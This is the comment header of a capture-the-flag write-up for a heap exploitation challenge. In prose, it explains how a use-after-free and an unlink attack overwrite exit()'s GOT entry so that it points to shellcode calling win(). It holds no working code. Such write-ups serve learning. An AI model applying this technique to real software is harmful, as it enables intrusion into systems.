# Category: Binary Exploitation
# Points: 400 (solved after comp)
# Description: Just pwn this program and get a flag. Itâ€™s also found in /problems/afterlife_6_1c6bc56bd64007e5162e284db4d03df5 on the shell server. Source.
#
# First heap chall ever solved (with help of course)! :) So, the main exploit of this chall
# is the Use-After-Free (UAF) vuln. In the program, there is a "first" chunk that is stuck
# in a fast bin (FIFO manner of using freed chunks), and the program leaks a heap addr,
# suggesting you use it. Then, gets(first) is called, meaning you have the ability to
# edit the chunk's contents before it gets malloc()'s as the "seventh" chunk. The structure
# of the chunk looks like this:
# Heap addr points here -> |    Size of chunk   | So, the way we can utilize the UAF vuln
#                          |     fd pointer     | is through a technique called the
#                          |     bk pointer     | "unlink attack." When free() is called,
#                          |      user data     | the unlink macro does this: first->fd->bk = bk
#                          | Size of next chunk | and first->bk->fd = fd. Here, the program
# thinks that the pointers I put in here (in the script) are other freed chunks, but in
# reality they are memory that I am overwriting. Thus, I can perform a GOT overwrite. I
# initially wanted to just have the GOT entry of exit() point directly to the win()
# function to grab the flag, but I realized that I couldn't do it since the unlink macro
# would overwrite some instruction in win() w/ the fd pointer I placed. So, as in the
# write-ups I looked up for this chall, I created a shellcode that would call win() and
# Had the GOT entry point to that so that when the first->bk->fd = fd part is performed,
# it has not effects on the instructions (it writes below the shellcode). Once the payload
# is sent and malloc() is called, when exit() is called, it will instead call win(), thus
# giving me the dub.
